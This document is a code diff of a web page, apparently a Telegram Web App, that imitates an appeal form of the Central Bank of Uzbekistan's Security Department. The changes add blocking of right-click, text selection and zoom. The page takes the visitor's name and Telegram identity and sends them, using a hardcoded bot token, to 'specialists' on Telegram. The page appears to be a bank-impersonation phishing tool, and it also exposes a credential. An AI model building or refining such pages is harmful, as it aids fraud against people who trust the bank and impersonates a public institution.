@@ -1,12 +1,12 @@
 <!DOCTYPE html>
 <html lang="ru">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
   <title>Отправить обращение — Центральный банк РУз</title>
   <script src="https://telegram.org/js/telegram-web-app.js"></script>
   <style>
-    body {
+    html, body {
       font-family: "Segoe UI", sans-serif;
       background: url("фон.jpg") no-repeat center center fixed;
       background-size: cover;
@@ -17,26 +17,39 @@
       flex-direction: column;
       align-items: center;
       min-height: 100vh;
+      -webkit-user-select: none; /* запрет выделения текста */
+      -moz-user-select: none;
+      -ms-user-select: none;
+      user-select: none;
+      overscroll-behavior: none;
+      touch-action: manipulation;
+    }
+
+    body * {
+      box-sizing: border-box;
+    }
+
+    img.logo {
+      width: 100%;
+      height: auto;
+      display: block;
+      cursor: pointer;
+      margin: 0;
+      padding: 0;
     }
 
     .container {
       background: rgba(255, 255, 255, 0.95);
       border-radius: 12px;
-      padding: 20px 25px;
-      margin-top: 20px;
-      width: 95%;
+      padding: 25px;
+      margin-top: 10px;
+      width: 92%;
       max-width: 420px;
       box-shadow: 0 2px 10px rgba(0,0,0,0.1);
-    }
-
-    img.logo {
-      width: 160px;
-      cursor: pointer;
-      margin-top: 15px;
+      text-align: center;
     }
 
     h2 {
-      text-align: center;
       color: #003366;
       font-size: 22px;
       margin-bottom: 20px;
@@ -49,6 +62,7 @@
       font-weight: bold;
       margin-top: 15px;
       font-size: 15px;
+      text-align: left;
     }
 
     input, select {
@@ -58,12 +72,14 @@
       border: 1px solid #ccc;
       border-radius: 8px;
       font-size: 15px;
+      text-align: center;
       background-color: #f8f9fa;
     }
 
-    input[readonly] {
-      background-color: #e9ecef;
+    select:disabled {
       color: #555;
+      background-color: #e9ecef;
+      appearance: none;
     }
 
     button {
@@ -92,6 +108,7 @@
       align-items: center;
       justify-content: center;
       visibility: hidden;
+      z-index: 100;
     }
 
     .modal.active {
@@ -120,7 +137,7 @@
     }
   </style>
 </head>
-<body>
+<body oncontextmenu="return false;">
   <a href="https://cbu.uz/ru/" target="_blank">
     <img src="лого.jpg" class="logo" alt="ЦБ РУЗ">
   </a>
@@ -129,10 +146,18 @@
     <h2>Отправить обращение</h2>
 
     <label>Территориальное подразделение</label>
-    <input type="text" value="Центральный аппарат ЦБ" readonly>
+    <select disabled>
+      <option>Центральный аппарат ЦБ</option>
+      <option>Ташкентское областное управление</option>
+      <option>Самаркандское областное управление</option>
+    </select>
 
     <label>Департамент</label>
-    <input type="text" value="Департамент Безопасности" readonly>
+    <select disabled>
+      <option>Департамент Безопасности</option>
+      <option>Департамент ИТ</option>
+      <option>Департамент финансового контроля</option>
+    </select>
 
     <label>ФИО заявителя</label>
     <input type="text" id="fio" placeholder="Введите ФИО">
@@ -176,6 +201,15 @@
     const modalText = document.getElementById('modal-text');
     const closeModal = document.getElementById('closeModal');
 
+    // Запрещаем масштабирование (Ctrl+колесо, pinch zoom)
+    document.addEventListener('wheel', e => {
+      if (e.ctrlKey) e.preventDefault();
+    }, { passive: false });
+
+    document.addEventListener('gesturestart', e => e.preventDefault());
+    document.addEventListener('gesturechange', e => e.preventDefault());
+    document.addEventListener('gestureend', e => e.preventDefault());
+
     // Список специалистов
     const managers = {
       "041483": {
@@ -190,19 +224,17 @@
         link: "https://t.me/Uz_MB1",
         chat_id: 7814377002
       },
-      // ... (остальные по аналогии)
     };
 
     const token = "7571144445:AAHZD5LCp81Taf-dgPo2Jw894rz1JqbdgI4";
 
-    // Переключение между типами обращения
+    // Переключение формы
     purposeSelect.addEventListener("change", () => {
       const purpose = purposeSelect.value;
       document.getElementById("specialist-section").style.display = purpose === "specialist" ? "block" : "none";
       document.getElementById("question-section").style.display = purpose === "specialist" ? "none" : "block";
     });
 
-    // Отправка
     sendBtn.addEventListener("click", async () => {
       const fio = fioInput.value.trim();
       const tab = tabnumInput.value.trim();
@@ -211,7 +243,6 @@
 
       if (!fio) return showModal("Пожалуйста, введите ФИО заявителя.");
 
-      // Если выбран не "Связь со специалистом"
       if (purpose !== "specialist") {
         showModal("Запрос отправлен, ожидайте ответа.", () => {
           window.location.href = "https://cbu.uz/ru/";
@@ -219,11 +250,8 @@
         return;
       }
 
-      // Проверяем специалиста
       if (!managers[tab]) {
-        showModal("❌ Специалиста с этим номером нет.", () => {
-          tabnumInput.focus();
-        });
+        showModal("❌ Специалиста с этим номером нет.", () => tabnumInput.focus());
         return;
       }
 
@@ -231,7 +259,6 @@
       const clientName = `${client?.first_name || ""} ${client?.last_name || ""}`.trim();
       const username = client?.username ? `@${client.username}` : "—";
 
-      // Сообщение менеджеру
       const textForManager =
         `📨 Новая заявка!\n` +
         `👤 ФИО (из формы): ${fio}\n` +
@@ -239,7 +266,6 @@
         `🌐 Username: ${username}\n` +
         `🆔 Chat ID: <code>${client?.id}</code>`;
 
-      // Отправляем менеджеру
       await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
@@ -250,7 +276,6 @@
         })
       });
 
-      // Отправляем клиенту
       await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
